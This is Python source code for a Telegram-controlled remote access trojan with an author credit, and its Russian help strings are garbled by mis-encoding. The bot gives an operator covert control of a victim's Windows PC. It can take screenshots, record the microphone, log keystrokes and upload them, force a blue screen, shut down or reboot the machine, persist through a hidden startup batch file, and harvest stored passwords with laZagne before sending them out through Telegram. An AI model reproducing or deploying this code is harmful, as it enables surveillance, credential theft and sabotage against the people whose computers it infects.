import re
import cv2
import wave
import time
import ctypes
import random
import socket
import telebot
import getpass
import pyaudio
import os, sys
import requests
import pyautogui
import webbrowser
from ctypes import *
from settings.config import *
from sys import platform
from pynput import keyboard
from bs4 import BeautifulSoup
from ctypes.wintypes import *
from playsound import playsound
from PIL import Image, ImageGrab

USER_NAME = getpass.getuser()

HELP_MESSAGE_RU = '''
–ê–≤—Ç–æ—Ä Arman
/off(–≤—ã–∫–ª –ø–∫)
/open(–æ—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É –≤ –±—Ä–∞—É–∑–µ—Ä–µ)
/screen(—Å–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞)
/process(–≤–∫–ª—é—á–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å)
/kill(—É–±–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å)
/reboot(–ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ø–∫)
/ip(—É–∑–Ω–∞—Ç—å ip,–≥–æ—Ä–æ–¥,–±—Ä–∞—É–∑–µ—Ä)
/rep(–∑–∞–ø—É—Å—Ç–∏—Ç—å —Ñ–∞–π–ª.mp3)
/record(–∑–∞–ø–∏—Å–∞—Ç—å –∑–≤—É–∫–∏ —Å –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞)
/tasklist(—É–∑–Ω–∞—Ç—å —Å–ø–∏—Å–æ–∫ –∑–∞–ø—É—â–µ–Ω–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤)
/oc(—É–∑–Ω–∞—Ç—å –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω—É—é —Å–∏—Å—Ç–µ–º—É –∏ –∏–º—è —Å–∏—Å—Ç–µ–º—ã)
/bluescreen(–≤–∫–ª—é—á–∏—Ç—å —Å–∏–Ω–∏–π —ç–∫—Ä–∞–Ω)
/keylogger(–∑–∞–ø–∏—Å—ã–≤–∞–µ–º –≤—Å–µ –Ω–∞–∂–∞—Ç—ã–µ –∫–Ω–æ–ø–∫–∏)
/send(–æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ñ–∞–π–ª —Å –∑–∞–ø–∏—Å–∞–Ω–Ω—ã–º–∏ –∫–Ω–æ–ø–∫–∞–º–∏)
/auto(–¥–æ–±–∞–≤–∏—Ç—å —Ñ–∞–π–ª –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É)
/logs(–ø–æ–ª—É—á–µ–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π)
/help(–≤—ã–≤–æ–¥–∏—Ç —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ)
'''

HELP_MESSAGE_EN = '''
Author Arman
/off(off PC)
/open(open link in browser)
/screen(a screenshot of the screen)
/process(starting the process)
/kill(to kill the process)
/reboot(restart PC)
/ip(see ip,city,browser)
/rep(to run the file.mp3)
/record(record sounds from the microphone)
/tasklist(check the list of running processes)
/oc(learn operating system and the name of the system)
/bluescreen(include blue screen)
/keylogger(to write all button pressed)
/send(send file recorded with buttons)
/auto(to add a file to the startup)
/logs(get password)
/help(outputs this message)
'''

bot = telebot.TeleBot(TOKEN)

mainkeyboard = telebot.types.ReplyKeyboardMarkup()

mainkeyboard.add('–ü–∏—Ç–∞–Ω–∏–µüü¢','–ó–∞–ø–∏—Å—åüîä','–ë—Ä–∞—É–∑–µ—Äüü°','–ü—Ä–∏–ª–æ–∂–µ–Ω–∏—èüü•','ipüà¥','–°–∫—Ä–∏–Ω—à–æ—ÇüëÄ','–ü–æ–º–æ—â—å‚öí')

powerkeyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)

powerkeyboard.add('–ù–∞–∑–∞–¥üóø','–í—ã–∫–ª—é—á–∏—Ç—å –ø–∫‚ö†Ô∏è','–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ø–∫üñ•')

appkeyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=3)

appkeyboard.add('–ù–∞–∑–∞–¥üóø','–£–±–∏—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ‚ùå','–í–∫–ª—é—á–∏—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ‚úÖ')

@bot.message_handler(content_types=['text'])
def commands(message):
        if message.text == '/start':
                bot.send_message(message.chat.id,'–í—ã–±–µ—Ä–∏ –¥–µ–π—Å—Ç–≤–∏–µ',reply_markup=mainkeyboard)

        elif message.text == '–ü–∏—Ç–∞–Ω–∏–µüü¢':
                bot.send_message(message.chat.id,'–í—ã–±–µ—Ä–∏ –¥–µ–π—Å—Ç–≤–∏–µ',reply_markup=powerkeyboard)

        elif message.text == '–ü—Ä–∏–ª–æ–∂–µ–Ω–∏—èüü•':
            bot.send_message(message.chat.id,'–í—ã–±–µ—Ä–∏ –¥–µ–π—Å—Ç–≤–∏–µ',reply_markup=appkeyboard)

        elif message.text == '–ù–∞–∑–∞–¥üóø':
                bot.send_message(message.chat.id,'–í–µ—Ä–Ω—É–ª –≤–∞—Å –Ω–∞–∑–∞–¥',reply_markup=mainkeyboard)

        elif message.text == '/off' or message.text == '–í—ã–∫–ª—é—á–∏—Ç—å –ø–∫‚ö†Ô∏è':
                bot.send_message(message.chat.id,'–ö–æ–º–ø—å—é—Ç–µ—Ä –±—É–¥–µ—Ç –≤—ã–∫–ª—é—á–µ–Ω!',reply_markup=powerkeyboard)
                os.system('shutdown -s')

        elif message.text == '/help' or message.text == '–ü–æ–º–æ—â—å‚öí':
                bot.send_message(message.chat.id,HELP_MESSAGE_RU if LANGUAGE == 'RU' else HELP_MESSAGE_EN,reply_markup=mainkeyboard)
        elif message.text == '/tasklist':
                try:
                        bot.send_chat_action(message.chat.id,'upload_document')
                        os.system('tasklist>  C:\\ProgramData\\Tasklist.txt')
                        tasklist = open('C:\\ProgramData\\Tasklist.txt')
                        bot.send_document(message.chat.id,tasklist)
                        tasklist.close()
                        os.remove('C:\\ProgramData\\Tasklist.txt')
                except:
                        bot.send_message(message.chat.id,'–û—à–∏–±–∫–∞,–Ω–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏–ª–æ—Å—å —Å–ø–∏—Å–æ–∫ ')

        elif message.text == '/open' or message.text == '–ë—Ä–∞—É–∑–µ—Äüü°':
                bot.register_next_step_handler(message,get_url)
                bot.send_message(message.chat.id,'–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É!',reply_markup=mainkeyboard)

        elif message.text == '/screen' or message.text == '–°–∫—Ä–∏–Ω—à–æ—ÇüëÄ':
                try:
                        bot.send_message(message.chat.id,'–î–µ–ª–∞—é —Å–∫—Ä–∏–Ω—à–æ—Ç')
                        screen = pyautogui.screenshot('screenshot.png')
                        screen = open('screenshot.png', 'rb')
                        bot.send_photo(message.chat.id, screen,reply_markup=mainkeyboard)
                        os.remove("screenshot.png")
                except:
                        pass

        elif message.text == '/process' or message.text == '–í–∫–ª—é—á–∏—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ‚úÖ':
                bot.send_message(message.chat.id,'–ö–∞–∫–æ–π –ø—Ä–æ—Ü–µ—Å—Å —Ö–æ—Ç–∏—Ç–µ –∑–∞–ø—É—Å—Ç–∏—Ç—å(steam.exe)',reply_markup=appkeyboard)
                bot.register_next_step_handler(message,get_process)


        elif message.text == '/ip' or message.text == 'ipüà¥':
                url = 'https://yandex.ru/internet/'
                page = requests.get(url)
                soup = BeautifulSoup(page.text, "html.parser")
                ip = soup.findAll('ul', class_='general-info layout__general-info')
                ip = str(ip)
                ip = re.sub('<[^>]*>', '\n', ip)
                bot.send_message(message.chat.id,'–ê–π–ø–∏ –∂–µ—Ä—Ç–≤—ã - ' + str(ip),reply_markup=mainkeyboard)

        elif message.text == '/kill' or message.text == '–£–±–∏—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ‚ùå':
                bot.send_message(message.chat.id,'–ö–∞–∫–æ–π –ø—Ä–æ—Ü–µ—Å—Å —Ö–æ—Ç–∏—Ç–µ —É–±–∏—Ç—å(steam.exe)')
                bot.register_next_step_handler(message,get_kill)


        elif message.text == '/reboot' or message.text == '–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ø–∫üñ•':
                bot.send_message(message.chat.id,'–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏–ª!')
                os.system('shutdown -r -t 0')

        elif message.text == '/rep':
                bot.send_message(message.chat.id,'–ö–∞–∫–æ–π —Ñ–∞–π–ª –≤—ã —Ö–æ—Ç–∏—Ç–µ –≤–∫–ª—é—á–∏—Ç—å?')
                bot.register_next_step_handler(message,get_audio)

        elif message.text == '/record' or message.text == '–ó–∞–ø–∏—Å—åüîä':
                bot.send_message(message.chat.id,'–°–∫–æ–ª—å–∫–æ —Å–µ–∫—É–Ω–¥ –∑–∞–ø–∏—Å–∞—Ç—å?(–Ω–µ –±–æ–ª—å—à–µ 60):')
                bot.register_next_step_handler(message,get_record)

        elif message.text == '/OC' or message.text == '/oc':
                if platform == "linux" or platform == "linux2":
                         bot.send_message(message.chat.id,'oc: linux\n–ò–º—è –ü–ö: ' + socket.gethostname())

                elif platform == "darwin":
                        bot.send_message(message.chat.id,'oc: OS X\n–ò–º—è –ü–ö: ' + socket.gethostname())

                elif platform == "win32":
                        bot.send_message(message.chat.id,'oc: Windows\n–ò–º—è –ü–ö: ' + socket.gethostname())

        elif message.text == '/bluescreen' or message.text == '–≠–∫—Ä–∞–Ω —Å–º–µ—Ä—Ç–∏':
                try:
                    tmp1 = c_bool()
                    tmp2 = DWORD()
                    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(tmp1))
                    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, byref(tmp2))
                    bot.send_message(message.chat.id, '–°–∏–Ω–∏–π —ç–∫—Ä–∞–Ω –≤–∫–ª')

                except:
                        bot.send_message(message.chat.id, '–æ—à–∏–±–∫–∞,–Ω–µ —É–¥–∞–ª–æ—Å—å –≤–∫–ª —Å–∏–Ω–∏–π —ç–∫—Ä–∞–Ω')

        elif message.text == '/keylogger':
                bot.send_message(message.chat.id,'–ö–µ–π–ª–æ–≥–≥–µ—Ä –≤–∫–ª,—á—Ç–æ –±—ã –ø–æ–ª—É—á–∏—Ç—å —Ñ–∞–π–ª /send')
                def on_press(key):
                        try:
                                item = open('pressed.txt','a+')
                                item.write(f'|{key.char}|')
                                item.close
                        except AttributeError:
                                pass

                def on_release(key):
                        print('{0} released'.format(
                        key))
                        if key == keyboard.Key.esc:
                                return False


                with keyboard.Listener(
                        on_press=on_press,
                        on_release=on_release) as listener:
                        listener.join()

                        listener = keyboard.Listener(
                        on_press=on_press,
                        on_release=on_release)
                        listener.start()
                
        elif message.text == '/send':
                try:

                        item = open('pressed.txt')
                        bot.send_message(message.chat.id,'–î–µ—Ä–∂–∏')
                        bot.send_document(message.chat.id,item)
                        item.close()
                except:
                        bot.send_message(message.chat.id,'–æ—à–∏–±–∫–∞')



        elif message.text == '/auto':
                def add_to_startup(file_path=""):
                        if file_path == "":
                                file_path = os.path.dirname(os.path.realpath(__file__))
                        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
                        with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
                                bat_file.write('nircmd win hide title "%ComSpec%"\n@echo off\n')
                                bat_file.write(r'start  %s' % file_path + '\\main.py')
                try:
                        add_to_startup()
                        bot.send_message(message.chat.id,'–¥–æ–±–∞–≤–∏–ª –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É')
                except:
                        bot.send_message(message.chat.id, '–æ—à–∏–±–∫–∞,–Ω–µ –¥–æ–±–∞–≤–∏–ª –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É|PS(–ú–ë –Ω–µ —Å–º–µ–Ω–∏–ª –∏–º—è —Ñ–∞–π–ª–∞ –æ–Ω–æ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ –ù–∞–∑–≤–∞–Ω–∏–µ)')


        elif message.text == '/logs':
                os.system('laZagne.exe all -oN')
                time.sleep(5)
                files = os.listdir()
                for file in files:
                        if 'credentials' in file:
                                password_file = open(file)
                                bot.send_document(message.chat.id,password_file)
                                password_file.close()
                        

                


def get_record(message):
        global record
        record = message.text
        try:
                record = int(record)
                if record < 60:
                        bot.send_message(message.chat.id,'–ó–∞–ø–∏—Å—ã–≤–∞—é,–ø–æ–¥–æ–∂–¥–∏')
                        CHUNK = 1024
                        FORMAT = pyaudio.paInt16
                        CHANNELS = 1
                        RATE = 44100
                        RECORD_SECONDS = record
                        WAVE_OUTPUT_FILENAME = "audio.wav"
                        p = pyaudio.PyAudio()
                        stream = p.open(format=FORMAT,
                                        channels=CHANNELS,
                                        rate=RATE,
                                        input=True,
                                        input_device_index=1,
                                        frames_per_buffer=CHUNK)
                        frames = []
                        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                            data = stream.read(CHUNK)
                            frames.append(data)
                        stream.stop_stream()

                        stream.close()

                        p.terminate()

                        wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')

                        wf.setnchannels(CHANNELS)

                        wf.setsampwidth(p.get_sample_size(FORMAT))

                        wf.setframerate(RATE)

                        wf.writeframes(b''.join(frames))

                        wf.close()

                        audio = open('audio.wav', 'rb')

                        bot.send_audio(message.chat.id, audio)
                else:
                        bot.send_message(message.chat.id,'—Å–∫–∞–∑–∞–Ω–æ –Ω–µ –±–æ–ª—å—à–µ 60sec!',reply_markup=mainkeyboard)

        except:
                bot.send_message(message.chat.id,'–≤ —á–∏—Å–ª–æ–≤–æ–º —Ñ–æ—Ä–º–∞—Ç–µ!',reply_markup=mainkeyboard)

def get_audio(message):
        global audio
        audio = message.text
        try:
                playsound(audio)
                bot.send_message(message.chat.id,'–í–∫–ª—é—á–∏–ª –¥–∞–Ω–Ω—ã–π —Ñ–∞–π–ª\n ' + audio,reply_markup=mainkeyboard)
        except:
                bot.send_message(message.chat.id,'–ù–µ –Ω–∞—à–µ–ª –¥–∞–Ω–Ω—ã–π —Ñ–∞–π–ª\n ' + audio,reply_markup=mainkeyboard)

def get_url(message):
        global url
        url = message.text
        webbrowser.open_new_tab(url)
        bot.send_message(message.chat.id,'–°—Å—ã–ª–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∞!',reply_markup=mainkeyboard)

def get_process(message):
        global process
        process = message.text
        try:
                os.startfile(process)
                bot.send_message(message.chat.id,'–í–∫–ª—é—á–∏–ª –¥–∞–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å\n' + process,reply_markup=appkeyboard)
        except:
                 bot.send_message(message.chat.id,'–í—ã –≤–≤–µ–ª–∏ —á—Ç–æ-—Ç–æ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ,–æ—à–∏–±–∫–∞!',reply_markup=mainkeyboard)

def get_kill(message):
        global kill
        kill = message.text
        try:
                os.system("taskkill /im " + kill)
                bot.send_message(message.chat.id,'–î–∞–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å —É–±–∏—Ç\n' + kill,reply_markup=appkeyboard)
        except:
                bot.send_message(message.chat.id,'–í—ã –≤–≤–µ–ª–∏ —á—Ç–æ-—Ç–æ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ,–æ—à–∏–±–∫–∞!',reply_markup=mainkeyboard)

try:
        bot.polling(none_stop=True, interval=0)
        print('Bot (ok)')
except Exception as e:
        print(f'Bot (erorr)\n {e}')
